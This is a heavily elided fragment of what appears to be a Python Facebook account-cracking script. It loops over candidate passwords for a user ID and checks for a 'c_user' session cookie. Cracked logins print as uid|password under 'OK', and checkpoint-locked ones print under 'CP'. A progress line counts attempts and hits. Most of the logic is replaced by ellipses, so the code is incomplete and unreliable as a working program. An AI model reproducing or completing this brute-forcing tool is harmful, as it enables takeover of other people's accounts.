    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[K3NH-OK😘 {uid}|{ps}")
                ...
                print(f"\x1b[38;5;196m[K3NG-CP🔒] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[K3NG💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
